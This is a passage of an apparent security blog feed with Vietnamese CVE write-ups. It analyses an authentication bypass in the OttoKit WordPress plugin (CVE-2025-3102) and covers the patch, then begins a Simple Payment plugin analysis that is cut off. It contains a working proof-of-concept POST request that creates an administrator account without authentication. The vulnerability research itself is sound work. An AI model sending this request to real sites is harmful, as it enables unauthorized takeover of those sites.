wp_update_user( wp_slash( $userdata ) );&#xA;    } else {&#xA;        $user_id = wp_insert_user( wp_slash( $userdata ) );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y l·∫•y c√°c tham s·ªë ƒë·∫ßu v√†o t·ª´ request, th·ª±c hi·ªán chu·∫©n h√≥a d·ªØ li·ªáu (email, username, m·∫≠t kh·∫©u), sau ƒë√≥ ki·ªÉm tra xem ng∆∞·ªùi d√πng ƒë√£ t·ªìn t·∫°i trong h·ªá th·ªëng hay ch∆∞a th√¥ng qua &lt;strong&gt;email&lt;/strong&gt; v√† &lt;strong&gt;username&lt;/strong&gt;. N·∫øu ng∆∞·ªùi d√πng ch∆∞a t·ªìn t·∫°i, h√†m s·∫Ω t·∫°o m·ªõi t√†i kho·∫£n b·∫±ng &lt;code&gt;wp_insert_user&lt;/code&gt;; ng∆∞·ª£c l·∫°i, n·∫øu ƒë√£ t·ªìn t·∫°i, h·ªá th·ªëng s·∫Ω c·∫≠p nh·∫≠t th√¥ng tin ng∆∞·ªùi d√πng t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;p&gt;Theo lu·ªìng ph√¢n t√≠ch tr√™n, to√†n b·ªô c√°c tham s·ªë ƒë·∫ßu v√†o ƒë·ªÅu c√≥ th·ªÉ b·ªã attacker ki·ªÉm so√°t th√¥ng qua request. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch·ªß ƒë·ªông truy·ªÅn d·ªØ li·ªáu t√πy √Ω, bao g·ªìm c·∫£ tr∆∞·ªùng &lt;strong&gt;&lt;code&gt;role&lt;/code&gt;&lt;/strong&gt;. Khi h√†m &lt;code&gt;_action_listener()&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi, h·ªá th·ªëng s·∫Ω t·∫°o m·ªõi ng∆∞·ªùi d√πng v·ªõi role do attacker ch·ªâ ƒë·ªãnh, t·ª´ ƒë√≥ c√≥ th·ªÉ t·∫°o t√†i kho·∫£n v·ªõi quy·ªÅn &lt;strong&gt;administrator&lt;/strong&gt;, d·∫´n ƒë·∫øn chi·∫øm quy·ªÅn ki·ªÉm so√°t to√†n b·ªô website.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;code&gt;v1.0.78&lt;/code&gt; ƒë√£ b·ªï sung ki·ªÉm tra ch·∫∑t ch·∫Ω gi√° tr·ªã c·ªßa &lt;code&gt;secret_key&lt;/code&gt; tr∆∞·ªõc khi so s√°nh&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-14-cve-2025-3102/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2026-01-14-cve-2025-3102/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-14-cve-2025-3102/patch.png&#39; alt=&#34;Patch&#34; height=&#34;446&#34; width=&#34;1004&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bao g·ªìm x√°c th·ª±c ki·ªÉu d·ªØ li·ªáu, ki·ªÉm tra r·ªóng ƒë·ªëi v·ªõi c·∫£ header nh·∫≠n t·ª´ request v√† gi√° tr·ªã &lt;code&gt;secret_key&lt;/code&gt; ƒë∆∞·ª£c c·∫•u h√¨nh trong h·ªá th·ªëng. Ngo√†i ra, h√†m so s√°nh ƒë∆∞·ª£c thay th·∫ø b·∫±ng &lt;code&gt;hash_equals()&lt;/code&gt; ƒë·ªÉ tr√°nh r√≤ r·ªâ th√¥ng tin qua timing attack. Nh·ªù ƒë√≥, tr∆∞·ªùng h·ª£p plugin ch∆∞a ƒë∆∞·ª£c c·∫•u h√¨nh API key ho·∫∑c request kh√¥ng truy·ªÅn header h·ª£p l·ªá s·∫Ω b·ªã t·ª´ ch·ªëi ngay, ngƒÉn ch·∫∑n kh·∫£ nƒÉng bypass x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send crafted HTTP request to&amp;lt;br/&amp;gt;/wp-json/sure-triggers/v1/automation/action&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress REST Router&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;permission_callback:&amp;lt;br/&amp;gt;autheticate_user($request)&amp;#34;]&#xA;&#xA;D --&amp;gt; E{&amp;#34;Plugin configured API key ?&amp;#34;}&#xA;E -- No (secret_key = null) --&amp;gt; F[&amp;#34;$secret_key from header = null&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;null !== null ‚Üí false&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Authentication BYPASS&amp;#34;]&#xA;&#xA;E -- Yes --&amp;gt; X[&amp;#34;Normal authentication flow&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;callback:&amp;lt;br/&amp;gt;run_action($request)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Extract params via get_param():&amp;lt;br/&amp;gt;integration, type_event, selected_options, fields, context&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;integration &amp;amp; type_event valid ?&amp;#34;}&#xA;K -- No --&amp;gt; Y[&amp;#34;Return error&amp;#34;]&#xA;K -- Yes --&amp;gt; L[&amp;#34;Skip wp_user_email validation if not provided&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Load registered actions:&amp;lt;br/&amp;gt;EventController::get_instance()-&amp;gt;actions&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Resolve action:&amp;lt;br/&amp;gt;actions[integration][type_event]&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Prepare function parameters&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;call_user_func_array(action_function, params)&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;_action_listener() executed&amp;#34;]&#xA;&#xA;Q --&amp;gt; R[&amp;#34;Read user_email, user_name, password, role from attacker-controlled input&amp;#34;]&#xA;&#xA;R --&amp;gt; S{&amp;#34;User exists ?&amp;#34;}&#xA;S -- Yes --&amp;gt; T[&amp;#34;wp_update_user()&amp;#34;]&#xA;S -- No --&amp;gt; U[&amp;#34;wp_insert_user() with attacker-controlled role&amp;#34;]&#xA;&#xA;U --&amp;gt; V[&amp;#34;New WordPress user created&amp;#34;]&#xA;&#xA;V --&amp;gt; W[&amp;#34;Privilege escalation / Full site compromise&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;G·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/sure-triggers/v1/automation/action HTTP/1.1&#xA;Host: localhost&#xA;st_authorization: Bearer &#xA;&#xA;wp_user_id=1&amp;amp;integration=WordPress&amp;amp;type_event=create_user_if_not_exists&amp;amp;selected_options[user_name]=hacker&amp;amp;selected_options[password]=hacker&amp;amp;selected_options[role]=administrator&amp;amp;selected_options[user_email]=hacker@gmail.com&amp;amp;selected_options[first_name]=hacker&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-14-cve-2025-3102/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-14-cve-2025-3102/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-14-cve-2025-3102/result.png&#39; alt=&#34;Result&#34; height=&#34;1089&#34; width=&#34;2175&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Login v·ªõi user v·ª´a t·∫°o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-3102 l√† m·ªôt l·ªó h·ªïng &lt;strong&gt;authentication bypass&lt;/strong&gt; trong plugin WordPress OttoKit (‚â§ 1.0.78), b·∫Øt ngu·ªìn t·ª´ vi·ªác thi·∫øu ki·ªÉm tra gi√° tr·ªã r·ªóng c·ªßa &lt;code&gt;secret_key&lt;/code&gt; trong h√†m &lt;code&gt;autheticate_user()&lt;/code&gt;. Khi plugin ƒë∆∞·ª£c c√†i ƒë·∫∑t nh∆∞ng ch∆∞a c·∫•u h√¨nh API key, request v·ªõi header r·ªóng c√≥ th·ªÉ v∆∞·ª£t qua b∆∞·ªõc x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi bypass th√†nh c√¥ng, attacker c√≥ th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp endpoint &lt;code&gt;run_action()&lt;/code&gt; v√† ki·ªÉm so√°t to√†n b·ªô tham s·ªë ƒë·∫ßu v√†o. B·∫±ng c√°ch k√≠ch ho·∫°t action &lt;code&gt;create_user_if_not_exists&lt;/code&gt;, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·∫°o t√†i kho·∫£n m·ªõi v·ªõi role t√πy √Ω, bao g·ªìm c·∫£ quy·ªÅn administrator, d·∫´n ƒë·∫øn chi·∫øm quy·ªÅn ki·ªÉm so√°t website.&lt;/p&gt;&#xA;&lt;p&gt;Phi√™n b·∫£n 1.0.79 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ki·ªÉm tra ch·∫∑t ch·∫Ω d·ªØ li·ªáu ƒë·∫ßu v√†o v√† s·ª≠ d·ª•ng &lt;code&gt;hash_equals()&lt;/code&gt; ƒë·ªÉ so s√°nh an to√†n, ngƒÉn ch·∫∑n kh·∫£ nƒÉng bypass x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Logic x√°c th·ª±c c·∫ßn lu√¥n ki·ªÉm tra ƒë·∫ßy ƒë·ªß gi√° tr·ªã r·ªóng v√† ki·ªÉu d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;li&gt;C∆° ch·∫ø x√°c th·ª±c ph·∫£i m·∫∑c ƒë·ªãnh t·ª´ ch·ªëi khi tr·∫°ng th√°i kh√¥ng h·ª£p l·ªá ho·∫∑c ch∆∞a c·∫•u h√¨nh.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác th·ª±c thi h√†m ƒë·ªông d·ª±a tr√™n d·ªØ li·ªáu t·ª´ request l√†m tƒÉng ƒë√°ng k·ªÉ b·ªÅ m·∫∑t t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;li&gt;C√°c tham s·ªë nh·∫°y c·∫£m nh∆∞ role kh√¥ng n√™n ƒë∆∞·ª£c ph√©p ki·ªÉm so√°t tr·ª±c ti·∫øp t·ª´ ph√≠a client.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn ki·ªÉm th·ª≠ c·∫£ c√°c k·ªãch b·∫£n sai c·∫•u h√¨nh, kh√¥ng ch·ªâ tr∆∞·ªùng h·ª£p ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n c·∫≠p nh·∫≠t plugin l√™n phi√™n b·∫£n ƒë√£ ƒë∆∞·ª£c v√° ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-plugin-1-0-78-authorization-bypass-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress OttoKit Plugin &amp;lt;= 1.0.78 is vulnerable to a high priority Bypass Vulnerability&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-4796 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-13-cve-2025-6688/</link>
      <pubDate>Tue, 13 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-13-cve-2025-6688/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-13-cve-2025-6688/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-4796&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-4796&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Bypass Vulnerability&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 1.3.6-2.3.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.3.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/simple-payment/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Simple Payment Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Simple Payment&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.3.8&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.3.9&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;parse_request&amp;#39;, [ $this, &amp;#39;callback&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;parse_request&lt;/code&gt; l√† action hook ƒë∆∞·ª£c g·ªçi r·∫•t s·ªõm trong qu√° tr√¨nh x·ª≠ l√Ω request, sau khi WordPress ƒë√£ ph√¢n t√≠ch URL (query vars) v√† tr∆∞·ªõc khi truy v·∫•n database (&lt;code&gt;WP_Query&lt;/code&gt;) ƒë∆∞·ª£c th·ª±c thi.&lt;/p&gt;&#xA;&lt;p&gt;Khi c√≥ request ƒë·∫øn, h√†m &lt;code&gt;callback&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω request t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function callback() {&#xA;    $callback = parse_url( $this-&amp;gt;callback );&#xA;    $info     = parse_url( $_SERVER[&amp;#39;REQUEST_URI&amp;#39;] );&#xA;&#xA;    if ( isset( $info[&amp;#39;path&amp;#39;], $callback[&amp;#39;path&amp;#39;] ) &amp;amp;&amp;amp; $info[&amp;#39;path&amp;#39;] != $callback[&amp;#39;path&amp;#39;] ) return;&#xA;&#xA;    $ops = explode( &amp;#39;/&amp;#39;, $info[&amp;#39;path&amp;#39;] );&#xA;&#xA;    if ( !( isset( $_REQUEST[ self::OP ] ) || ( count( $ops ) == 4 &amp;amp;&amp;amp; strtolower( $ops[1] ) == &amp;#39;sp&amp;#39; ) ) ) return;&#xA;&#xA;    $url = null;&#xA;&#xA;    $engine = isset( $_REQUEST[&amp;#39;engine&amp;#39;] )&#xA;        ? sanitize_text_field( $_REQUEST[&amp;#39;engine&amp;#39;] )&#xA;        : ( isset( $ops[2] ) &amp;amp;&amp;amp; $ops[2] ? $ops[2] : self::param( &amp;#39;engine&amp;#39; ) );&#xA;&#xA;    $op = isset( $_REQUEST[ self::OP ] )&#xA;        ? strtolower( sanitize_text_field( $_REQUEST[ self::OP ] ) )&#xA;        : strtolower( isset( $ops[3] 